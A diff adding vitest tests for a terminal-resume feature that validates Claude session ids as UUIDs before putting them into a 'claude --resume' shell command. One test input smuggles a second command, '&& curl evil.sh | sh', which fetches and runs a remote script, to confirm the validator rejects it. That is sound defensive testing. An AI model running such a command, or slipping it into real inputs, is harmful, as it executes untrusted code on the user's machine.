@@ -1,5 +1,10 @@
 import { describe, it, expect } from 'vitest';
-import { closedTerminalsOf, buildClosedTerminalRows } from './closedTerminals';
+import {
+  closedTerminalsOf,
+  buildClosedTerminalRows,
+  isClaudeSessionId,
+  resumeStartupCommand,
+} from './closedTerminals';
 
 describe('closedTerminalsOf', () => {
   it('returns [] when the field is missing (old daemon) or malformed', () => {
@@ -109,5 +114,57 @@ describe('buildClosedTerminalRows', () => {
       new Set(),
     );
     expect(rows).toEqual([]);
+  });
+});
+
+// ── B-149: continue a terminal that died in a restart ────────────────────────
+
+const UUID = 'c0c26854-5e0c-4063-aaeb-d4428fe8ed94';
+
+describe('resume ids (B-149)', () => {
+  it('accepts only uuids — the value ends up in a shell command', () => {
+    expect(isClaudeSessionId(UUID)).toBe(true);
+    expect(isClaudeSessionId('c0c26854')).toBe(false);
+    expect(isClaudeSessionId(`${UUID} && curl evil.sh | sh`)).toBe(false);
+    expect(isClaudeSessionId(undefined)).toBe(false);
+  });
+
+  it('builds the resume command from a valid id and nothing from junk', () => {
+    expect(resumeStartupCommand(UUID)).toBe(`claude --resume ${UUID}`);
+    expect(resumeStartupCommand('nope')).toBeUndefined();
+    expect(resumeStartupCommand(undefined)).toBeUndefined();
+  });
+
+  it('parses claudeSessionId / reason, dropping malformed values', () => {
+    const [ok] = closedTerminalsOf({
+      closedTerminals: [{ id: 'a', closedAt: 1, claudeSessionId: UUID, reason: 'daemon-gap' }],
+    });
+    expect(ok.claudeSessionId).toBe(UUID);
+    expect(ok.reason).toBe('daemon-gap');
+
+    const [junk] = closedTerminalsOf({
+      closedTerminals: [{ id: 'b', closedAt: 1, claudeSessionId: 'not-a-uuid', reason: 'exploded' }],
+    });
+    expect(junk.claudeSessionId).toBeUndefined();
+    expect(junk.reason).toBeUndefined();
+  });
+
+  it('surfaces the resume id and the gap flag on the row', () => {
+    const rows = buildClosedTerminalRows(
+      [{
+        id: 'm1', name: 'mac-office', online: true,
+        daemonState: {
+          closedTerminals: [
+            { id: 'gap', closedAt: 2, cwd: '/tmp', claudeSessionId: UUID, reason: 'daemon-gap' },
+            { id: 'plain', closedAt: 1, cwd: '/tmp' },
+          ],
+        },
+      }],
+      new Set<string>(),
+    );
+    expect(rows.map((r) => [r.terminalId, r.claudeSessionId, r.fromDaemonGap])).toEqual([
+      ['gap', UUID, true],
+      ['plain', undefined, false],
+    ]);
   });
 });
